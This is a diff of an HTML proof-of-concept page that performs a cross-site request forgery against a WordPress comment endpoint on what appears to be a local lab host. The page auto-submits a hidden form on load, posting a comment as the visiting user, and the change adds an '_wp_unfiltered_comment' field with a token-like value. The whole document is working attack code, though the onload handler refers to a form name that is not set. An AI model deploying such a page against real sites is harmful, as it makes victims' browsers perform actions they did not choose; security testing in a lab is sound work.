@@ -1,19 +1,12 @@
 <html>
   <head></head>
-  <body>
+  <body onload="document.csrfForm.submit()">
     <form action="http://wpdistillery.vm/wp-comments-post.php" method="POST">
       <input type="hidden" name="comment" value="Oh no! I got fooled!" />
       <input type="hidden" name="comment_post_ID" value="11" />
       <input type="hidden" name="comment_parent" value="0" />
-      <input
-        type="hidden"
-        name="http://wpdistillery.vm/?p=11"
-        value="4208142317"
-      />
+      <input type="hidden" name="_wp_unfiltered_comment" value="4208142317" />
       <input type="submit" value="Post+Comment" />
     </form>
-    <script>
-      document.csrfForm.submit();
-    </script>
   </body>
 </html>
